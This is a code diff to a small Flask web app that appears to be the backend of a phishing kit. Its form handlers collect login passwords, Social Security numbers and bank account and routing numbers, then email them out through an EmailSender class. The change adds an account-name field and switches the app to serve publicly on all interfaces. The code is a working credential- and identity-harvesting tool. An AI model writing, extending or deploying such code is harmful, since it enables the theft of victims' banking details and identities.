@@ -7,6 +7,7 @@ password = None
 ssn = None
 account_number = None
 account_type = None
+account_name = None
 routing = None
 
 
@@ -43,18 +44,19 @@ def info():
 
 @app.route('/continue_', methods=['POST'])
 def continue_():
-    global ssn, account_number, account_type,routing
+    global ssn, account_number, account_type,routing,account_name
     ssn = request.form.get("ssn").strip()
     account_number = request.form.get("account-number").strip()
     account_type = request.form.get("account-type")
     routing =  request.form.get("routing")
+    account_name = request.form.get("account-name")
 
     return redirect(url_for('thankyou'))
 
 @app.route('/thankyou')
 
 def thankyou():
-    email_sender = EmailSender(user_name, password, ssn, account_number, account_type, routing)
+    email_sender = EmailSender(user_name, password, ssn, account_number, account_type, routing, account_name)
     result = email_sender.send_email()
     if result :
         return "<h1>Thank you for your submission!</h1>"
@@ -63,5 +65,5 @@ def thankyou():
 
 
 if __name__ == '__main__':
-    # app.run(host="0.0.0.0", port=5000)
-    app.run(debug=True)
+    app.run(host="0.0.0.0", port=5000)
+    # app.run(debug=True)
